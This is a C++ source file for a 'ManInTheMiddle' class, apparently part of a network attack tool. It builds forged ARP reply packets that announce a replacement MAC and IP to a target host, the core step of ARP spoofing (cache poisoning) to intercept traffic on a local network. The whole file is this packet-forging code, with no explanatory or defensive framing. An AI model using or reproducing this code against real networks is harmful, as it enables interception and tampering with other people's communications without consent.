#ifndef MANINTHEMIDDLE_CPP
#define MANINTHEMIDDLE_CPP

#include    "ManInTheMiddle.hh"

ManInTheMiddle::ManInTheMiddle(t_network_data target, t_network_data replacement)
    :_target(target), _replacement(replacement)
{
}

ManInTheMiddle::~ManInTheMiddle()
{
}

void    ManInTheMiddle::setTargetData(t_network_data target)
{
    this->_target = target;
}

void    ManInTheMiddle::setReplacementData(t_network_data replacement)
{
    this->_replacement = replacement;
}

void    ManInTheMiddle::buildArpPacket()
{
    this->_packet.setHtype(1);
    this->_packet.setPtype(0x0800);
    this->_packet.setHlen(6);
    this->_packet.setPlen(4);
    this->_packet.setOper(2);
    this->_packet.setSha(this->_replacement.mac);
    this->_packet.setSpa(this->_replacement.ip);
    this->_packet.setTha(this->_target.mac);
    this->_packet.setTpa(this->_target.ip);
}

ARP<Ethernet>   ManInTheMiddle::getPacket()
{
    return this->_packet;
}

#endif // MANINTHEMIDDLE_CPP

